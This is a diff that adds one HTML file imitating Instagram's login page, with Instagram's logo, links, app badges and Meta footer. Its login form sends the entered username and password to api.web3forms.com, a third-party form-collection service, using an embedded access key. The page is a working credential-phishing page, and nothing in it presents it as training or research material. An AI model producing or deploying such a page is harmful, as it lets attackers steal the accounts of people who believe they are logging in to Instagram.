@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            overflow: hidden; /* Prevent body scrolling */
+        }
+        #container {
+            width: 350px;
+            text-align: center;
+            overflow-y: auto; /* Allow container scrolling */
+            max-height: 100vh; /* Set container max-height */
+        }
+        .main-top, .bottom, .app-section {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            padding: 20px;
+            margin-bottom: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .logo img {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: #fafafa;
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #aaa;
+        }
+        button, input[type="button"].login-btn {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        button:hover, input[type="button"].login-btn:hover {
+            background-color: #357ae8;
+        }
+        .or {
+            display: block;
+            margin: 20px 0;
+            color: #8e8e8e;
+            position: relative;
+        }
+        .or:before, .or:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #ccc;
+        }
+        .or:before {
+            left: 0;
+        }
+        .or:after {
+            right: 0;
+        }
+        .logInFB {
+            color: #385185;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logInFB i {
+            margin-right: 8px;
+        }
+        .forget {
+            margin-top: 10px;
+            color: #00376b;
+        }
+        .signUp {
+            color: #00376b;
+        }
+        .app-section {
+            text-align: center;
+        }
+        .app-section span {
+            display: block;
+            margin-bottom: 10px;
+        }
+        .images img {
+            width: 136px;
+            margin: 0 5px;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        footer a {
+            color: #00376b;
+            margin: 0 5px;
+            text-decoration: none;
+        }
+        .bottom-footer {
+            margin-top: 20px;
+        }
+        .bottom-footer select {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+<h2></h2>
+    <div id="container">
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+                </div>
+                <form action="https://api.web3forms.com/submit" method="post">
+                    <input type="hidden" name="access_key" value="c7033fc7-0e8f-4994-aaa5-6ed597317be4">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    <div class="password-container">
+                        <input type="password" name="passward" id="password" placeholder="Password" required>
+                        <i class="fas fa-eye-slash toggle-password" onclick="togglePasswordVisibility('password')"></i>
+                    </div>
+                    <button type="submit">Log In</button>
+                </form>
+                <span class="or">OR</span>
+                <div class="main-bottom">
+                    <a href="https://www.instagram.com/accounts/emailsignup/" class="logInFB"><i class="fab fa-facebook-f"></i> Log in with Facebook </a><br>
+                    <a href="https://www.instagram.com/accounts/password/reset/" class="forget">Forgot password?</a>
+                </div>
+            </div>
+            <div class="bottom">
+                <div class="signUp">
+                    Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
+                </div>
+            </div>
+            <div class="app-section">
+                <span>Get the app</span>
+                <div class="images">
+                    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Get it on Google Play">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D7B86C0E2-E13B-4B1C-BCB3-DDC7DB67DED9%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"></a>    
+                    <img src="https://developer.microsoft.com/store/badges/images/English_get-it-from-MS.png" alt="Get it from Microsoft">
+                </div>
+            </div>
+        </section>
+        <!-- Footer Section Starts from Here -->
+        <footer>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Instagram Contact</a>
+            <a href="#">Uploading & Non-Users</a>
+            <div class="bottom-footer">
+                <select name="language" id="language">
+                    <option value="English">English</option>
+                    <option value="Hindi">Hindi</option>
+                    <option value="Punjabi">Punjabi</option>
+                    <option value="Urdu">Urdu</option>
+                    <option value="Francais">Francais</option>
+                </select>
+                <span>&copy; 2023 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function togglePasswordVisibility(fieldId) {
+            const passwordField = document.getElementById(fieldId);
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                document.querySelector('.toggle-password').classList.remove('fa-eye-slash');
+                document.querySelector('.toggle-password').classList.add('fa-eye');
+            } else {
+                passwordField.type = "password";
+                document.querySelector('.toggle-password').classList.remove('fa-eye');
+                document.querySelector('.toggle-password').classList.add('fa-eye-slash');
+            }
+        }
+    </script>
+</body>
+</html>
